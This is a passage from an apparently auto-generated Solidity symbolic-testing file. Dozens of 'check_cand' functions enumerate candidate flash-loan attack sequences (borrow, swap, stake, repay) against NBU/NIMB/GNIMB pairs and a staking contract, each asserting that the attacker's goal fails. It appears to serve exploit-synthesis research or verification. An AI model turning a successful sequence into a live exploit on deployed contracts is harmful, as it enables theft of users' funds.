        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4790(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4791(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4792(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4793(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4794(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4795(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4796(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4797(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4798(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4799(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4800(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4801(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4802(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4803(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4804(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4805(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4806(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4807(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4808(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4809(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4810(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4811(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4812(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4813(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4814(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4815(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4816(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4817(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4818(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4819(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4820(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4821(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4822(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4823(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4824(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4825(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4826(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4827(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4828(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4829(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4830(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4831(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4832(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4833(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4834(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
